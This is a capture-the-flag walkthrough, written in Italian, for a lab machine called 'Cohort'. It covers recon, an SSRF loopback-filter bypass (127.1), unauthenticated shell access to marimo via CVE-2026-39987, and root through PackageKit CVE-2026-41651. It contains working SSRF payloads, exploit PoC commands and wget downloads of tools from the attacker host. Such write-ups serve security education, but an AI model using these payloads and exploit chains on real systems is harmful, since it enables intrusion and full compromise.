# Cohort


IP vittima: 10.129.244.174
IP attaccante: 10.10.15.99

## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.174 -oG porte`
```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

`sudo nmap -sC -sV -O -p22,80,443 10.129.244.174 -oN servizi`
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-title: Did not follow redirect to https://cohort.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dalla scansione emerge:
- porta `22/tcp` SSH
- porta `80/tcp` nginx che redirige a HTTPS
- porta `443/tcp` nginx
- hostname: `cohort.htb`
- certificato wildcard: `*.cohort.htb`
Inserire nel file `/etc/hosts ` l'host `10.129.244.174 cohort.htb`
## Client Insights Portal

Accediamo a:
```
http://cohort.htb
```
Dove è disponibile il link `Open Client Insights` che rimanda a
```
https://cohort.htb/portal.html
```

La pagina contiene la funzione **Register a report source URL**, che permette di indicare l'URL di un report remoto nei formati:

```
CSV
JSON
NDJSON
Parquet
```

Il sito spiega esplicitamente che, premendo **Validate source**, il server:

- risolve l'URL;
- prova a raggiungerlo;
- controlla status e content type;
- restituisce una breve preview.

La pagina avverte inoltre che:

```
internal and loopback addresses are rejected
```

Con [[BurpSuite]] impostato come proxy e `Intercept` attivo, abbiamo aperto nel browser di Burpsuite `https://cohort.htb/portal.html`, inserito un URL nel campo del Client Insights Portal e premuto **Validate source**. Burp ha intercettato la richiesta generata dal browser:

```
POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Length: 66
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Accept: application/json
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Origin: https://cohort.htb
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cohort.htb/portal.html
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"url":"https://reports.htb/exports/retention.csv","format":"csv"}
```

Abbiamo quindi inviato la richiesta a **Repeater**, da cui abbiamo potuto modificare liberamente il parametro `url` per testare una possibile SSRF.

Il parametro interessante è:

```
"url": "..."
```

perché il backend recupera direttamente la risorsa indicata dall'utente. Questo suggerisce immediatamente di testare una possibile **SSRF**.

Una **SSRF** (_Server-Side Request Forgery_) è una vulnerabilità in cui riesci a far sì che **sia il server vulnerabile a fare una richiesta HTTP al posto tuo** verso un indirizzo scelto da te.

Nel nostro caso il flusso normale era:

```
browser
  ↓
POST /api/validate
  ↓
server Cohort
  ↓
scarica l'URL indicato nel campo "url"
```

Quindi, se nel JSON metti:

```
{"url":"https://reports.htb/exports/retention.csv","format":"csv"}
```

è il server Cohort che contatta `reports.htb`.

Il problema nasce quando puoi cambiare liberamente quell'URL e chiedere al server di raggiungere risorse che dall'esterno non sono accessibili, per esempio:

```
{"url":"http://127.0.0.1:8888/","format":"json"}
```

In quel caso non sei tu a collegarti direttamente a `127.0.0.1:8888`: **è il server Cohort che effettua la richiesta verso il proprio localhost**.

Per questo una SSRF è utile per raggiungere:

- servizi interni;
- porte aperte solo su `127.0.0.1`;
- pannelli amministrativi non esposti;
- endpoint di metadata cloud;
- altri host della rete interna.

> Una SSRF consente a un attaccante di controllare la destinazione di una richiesta effettuata dal server, permettendo potenzialmente di raggiungere servizi interni o di loopback che non sono direttamente accessibili dall'esterno.

Proviamo ad accedere al loopback:

```
{
  "url": "http://127.0.0.1/",
  "format": "csv"
}
```

Il server blocca la richiesta:

```
Internal or loopback addresses are not permitted.
```

La protezione può però essere aggirata utilizzando una rappresentazione alternativa dell'indirizzo di loopback:

```
{
  "url": "http://127.1/",
  "format": "csv"
}
```

`127.1` viene interpretato dal sistema come:

```
127.0.0.1
```

ma supera il controllo applicativo.

La richiesta viene accettata e il backend restituisce il contenuto della pagina locale:

```
"ok": true, 
"fetched_status": 200, 
"content_type": "text/html", \
"preview": 
"<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Cohort Analytics</title>\n<meta name=\"description\" content=\"Cohort Analytics - retention intelligence for subscription teams.\">\n<link rel=\"stylesheet\" href=\"/assets/styles.css\">\n</head>\n<body>\n<div id=\"app\" data-page=\"home\" aria-busy=\"true\">\n  <div class=\"boot\"><span class=\"boot-mark\" aria-hidden=\"true\"></span><span>Loading Cohort Analytics</span></div>\n</div>\n<noscript>\n  <div style=\"max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;\">\n    <h1 style=\"font-size:1.4rem;\">JavaScript required</h1>\n    <p style=\"color:#4a5159;\">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>\n  </div>\n</noscript>\n<script src=\"/assets/app.js\" defer></script>\n</body>\n</html>\n", "message": "Source reachable."
```

Abbiamo quindi una SSRF funzionante:

```
/api/validate
      ↓
http://127.1/
      ↓
127.0.0.1
```
## Enumerazione dei servizi locali

Possiamo ora utilizzare Burp Repeater per interrogare porte accessibili solamente da localhost.

Modifichiamo progressivamente il parametro `url`.

```
{
  "url": "http://127.1:8888/",
  "format": "json"
}
```

otteniamo una risposta HTTP proveniente da un'altra applicazione:

```
"ok": true, 
"fetched_status": 200, 
"content_type": "text/html; charset=utf-8", 
"preview": 
"\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n", "message": "Source reachable."
```

Visto il titolo della pagina:

```
<title>marimo</title>
```

si tratta probabilmente di un applicazione **marimo** con redirect verso:

```
/auth/login
```

Abbiamo quindi individuato un servizio **marimo** interno sulla porta:

```
127.0.0.1:8888
```

Abbiamo quindi richiesto:

```
{
  "url": "http://127.1:8888/api/version",
  "format": "json"
}
```

ottenendo:

```
0.20.4
```

e identificando quindi il servizio come **marimo 0.20.4**.

Questa versione è vulnerabile a **CVE-2026-39987**, una vulnerabilità pre-authentication nel terminale WebSocket di marimo. L'endpoint:

```
/terminal/ws
```

non esegue correttamente il controllo di autenticazione e consente di ottenere una PTY shell senza credenziali. La vulnerabilità interessa marimo `<= 0.20.4` ed è stata corretta nella versione `0.23.0`.

Il problema, però, è che il servizio:

```
127.0.0.1:8888
```

non è direttamente raggiungibile dall'esterno.

Dobbiamo quindi trovare un modo per raggiungerlo attraverso nginx.
## Individuazione del virtual host interno

Attraverso la stessa SSRF interroghiamo l'endpoint locale:

```
{
  "url": "http://127.1/status",
  "format": "json"
}
```

La risposta contiene:

```
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {
      "name": "marketing",
      "host": "cohort.htb",
      "root": "/var/www/cohort"
    },
    {
      "name": "insights-api",
      "host": "cohort.htb",
      "path": "/api/",
      "target": "127.0.0.1:5000"
    },
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

Abbiamo quindi scoperto un virtual host nascosto:

```
nb-1be3782a8afd3ad5.cohort.htb
```

che nginx inoltra proprio verso:

```
127.0.0.1:8888
```

La struttura è quindi:

```
nb-1be3782a8afd3ad5.cohort.htb
             ↓
           nginx
             ↓
       127.0.0.1:8888
             ↓
         marimo 0.20.4
```
## Sfruttamento di CVE-2026-39987

La vulnerabilità consiste nell'assenza del controllo di autenticazione sull'endpoint WebSocket:

```
/terminal/ws
```

Gli altri endpoint WebSocket di marimo effettuano il controllo dell'autenticazione, mentre quello del terminale accetta la connessione senza verificare il token.

Utilizziamo questo POC: https://github.com/M3PH1569/CVE-2026-39987-POC

```
# 1. Clone the repository
git clone https://github.com/M3PH1569/CVE-2026-39987-POC.git
cd CVE-2026-39987-POC

# 2. Create and activate a virtual environment
python -m venv .CVE-2026-39987

source .CVE-2026-39987/bin/activate

# 3. Upgrade pip and Install required dependencies
python3 pip install --upgrade pip && pip install -r requirements.txt
```

Lanciamo lo script sul virtual host:

```
python3 CVE-2026-39987.py https://nb-1be3782a8afd3ad5.cohort.htb -i
```

Otteniamo una shell con l'utente **marimo**. Nella cartella **/home/marimo** troviamo la user flag.
# Privilege escalation

Scarichiamo [[linpeas]]sulla macchina target:

```
# 1. Avviamo un server python nella cartella della nostra macchina in cui è presente linpeas.sh
python3 -m http.server 8000

# Nella cartella /tmp della macchina target scarichiamo linpeas con wget
wget http://10.10.15.99:8000/linpeas.sh
```

Lanciamo linpeas

```
cd /tmp
bash linpeas.sh -r | tee linpeas_output.txt
```

La maggior parte dei classici vettori non mostra nulla di immediatamente sfruttabile: nessun eseguibile root-owned direttamente modificabile dall'utente e nessuna configurazione sudo utile. LinPEAS evidenzia però la presenza di **PackageKit**, disponibile sul system bus D-Bus e avviabile come servizio privilegiato:

```
usr/share/dbus-1/system-services/org.freedesktop.PackageKit.service:4:User=User=root
```

Questo significa che `packagekitd` è un servizio con cui un utente non privilegiato può comunicare tramite D-Bus, mentre il daemon vero e proprio viene eseguito come `root`.

È quindi un componente particolarmente interessante da controllare.

**PackageKit** è un servizio di sistema Linux che fornisce un'interfaccia comune per gestire i pacchetti software, indipendentemente dal package manager sottostante.

Su Ubuntu, per esempio, sotto PackageKit c'è comunque `apt/dpkg`, ma applicazioni grafiche come software center, updater e altri programmi possono parlare con PackageKit tramite **D-Bus** invece di invocare direttamente `apt`.

> D-Bus è il sistema di messaggistica IPC di Linux che permette ai processi di comunicare e invocare funzioni esposte da altri servizi, compresi servizi privilegiati come PackageKit.

Nel nostro caso è interessante perché il demone:

```
packagekitd
```

gira come:

```
root
```

e quindi può eseguire operazioni privilegiate come installare o aggiornare pacchetti. Questo è il motivo per cui una vulnerabilità in PackageKit può diventare una strada per la privilege escalation.
## Identificazione della versione di PackageKit

Per prima cosa abbiamo verificato la versione generale:

```
pkcon --version
```

Risultato:

```
1.2.8
```

Per ottenere però la revisione Ubuntu esatta abbiamo usato:

```
dpkg-query -W -f='${Package} ${Version}\n' packagekit
```

ottenendo:

```
packagekit 1.2.8-2ubuntu1.2
```

La versione installata è significativa. Su Ubuntu 24.04 LTS la correzione per **CVE-2026-41651** è presente nella revisione:

```
1.2.8-2ubuntu1.5
```

mentre la macchina utilizza ancora:

```
1.2.8-2ubuntu1.2
```

quindi una build precedente alla patch. Ubuntu classifica CVE-2026-41651 come una local privilege escalation di PackageKit.
## Sfruttamento CVE-2026-41651

Utilizziamo questo POC: https://github.com/mawussid/CVE-2026-41651-Python

Abbiamo scelto il PoC Python della vulnerabilità, che utilizza direttamente D-Bus per effettuare le due chiamate con il timing necessario.

Verifichiamo che sulla macchina target siano disponibili le librerie necessarie:

```
python3 -c 'import dbus, gi; from gi.repository import GLib; print("OK")'
```

ottenendo:

```
OK
```

La macchina è quindi già pronta per eseguire il PoC.
## Trasferimento dell'exploit

Sulla nostra macchina attacker scarichiamo il PoC Python:

```
git clone https://github.com/mawussid/CVE-2026-41651-Python.git
cd CVE-2026-41651-Python
```

avviamo un semplice HTTP server:

```
python3 -m http.server 8000
```

Sulla macchina target:

```
cd /tmp
wget http://10.10.15.99:8000/cve-2026-41651.py -O exploit.py
```

Il PoC dispone di una modalità di controllo:

```
python3 exploit.py --check
```

utile per verificare la configurazione prima di lanciare l'exploit completo.

```
═══════════════════════════════════════════════════
 CVE-2026-41651 / PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] PackageKit version : 1.2.8
[*] Vulnerable range   : 1.0.2 – 1.3.4
[+] VULNERABLE: version 1.2.8 is in the affected range
```
## Exploit

A questo punto basta eseguire:

```
python3 exploit.py
```

Il payload installato da PackageKit, viene eseguito con privilegi root, l'exploit ha avuto successo e abbiamo ottenuto la shell privilegiata.

Otteniamo una shell come **root** . Nella cartella **/root** troviamo la root flag.

Il punto fondamentale della privilege escalation è quindi che **non abbiamo sfruttato un normale binario SUID né una configurazione sudo errata**: abbiamo individuato un servizio privilegiato accessibile via D-Bus, determinato la versione installata di PackageKit scoprendo che era una revisione vulnerabile a **CVE-2026-41651**.
